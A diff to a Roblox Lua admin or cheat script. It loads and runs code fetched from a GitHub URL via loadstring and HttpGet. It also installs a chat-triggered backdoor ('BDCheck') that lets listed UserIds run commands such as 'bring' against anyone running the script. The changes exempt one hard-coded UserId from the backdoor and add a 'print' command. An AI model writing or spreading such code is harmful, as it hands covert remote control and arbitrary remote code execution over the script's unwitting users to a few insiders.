@@ -3,6 +3,7 @@ _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Lixalidy/FakeDH/main/detector.lua", true))()
 
+if game.Players.LocalPlayer.UserId ~= 472813752 then
 local AdminPrefix = "!"
 local Players = game:GetService("Players")
 local LocalP = Players.LocalPlayer;
@@ -246,6 +247,14 @@ getgenv().AdminCmdList = {
       end;
       ["Clearence"] = {[5] = true;};
   };
+  ["print"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              print(self)
+          end
+      end;
+      ["Clearence"] = {[5] = true;};
+  };
   ["bring"] = {
       ["CommandFunc"] = function(Player, self, CmdPlayer)
           if Player == LocalP or Player == "all" then
@@ -285,7 +294,7 @@ getgenv().BDCheck = function(Target2, Chat)
       local args = string.split(Chat:sub(2), " ")
       local Command = AdminCmdList[table.remove(args, 1)]
       local targ1 = psearch(table.remove(args, 1))
-      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+      if Command and targ1 then
           return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
       end
   end
@@ -297,9 +306,12 @@ for i = 1, #GP do
   CoolKidPlayer.Chatted:Connect(function(Word)
       BDCheck(CoolKidPlayer, Word)
   end)
-end -- Checks if you chatted a command
+end
 Players.PlayerAdded:Connect(function(CKP)
   CKP.Chatted:Connect(function(Message)
       BDCheck(CKP, Message)
   end)
 end)
+end
+
+--hi
